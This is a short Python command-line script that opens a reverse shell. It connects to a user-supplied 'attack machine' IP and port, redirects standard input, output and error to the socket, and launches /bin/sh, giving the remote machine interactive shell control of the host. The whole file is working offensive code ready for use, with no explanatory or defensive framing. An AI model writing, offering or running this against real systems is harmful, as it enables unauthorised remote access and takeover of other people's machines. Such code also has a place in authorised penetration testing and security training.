#!/usr/bin/python3

import argparse
import os
import socket
import subprocess

# Create CLI interface with arguments
parser = argparse.ArgumentParser(description="""Simple Reverse Shell script in
        Python that connects to a remote machine.""")

parser.add_argument('ip', metavar='IP',
                    help='IPv4 address of the remote machine')
parser.add_argument('port', metavar='PORT',
                    help='Port of the remote machine')

# Parse arguments
args = parser.parse_args()

# IP Address and Port of remote Attack Machine Server
IP = args.ip 
PORT = args.port 

# Convert Port to int
try:
    PORT = int(PORT)
except ValueError:
    print('{}: Invalid port "{}"'.format(__file__, PORT))
    exit(1)

# Create a Network Socket and Connect to remote Machine
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

# Duplicate socket's file descriptor to standard streams.
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Send reverse shell
p = subprocess.call(['/bin/sh'])
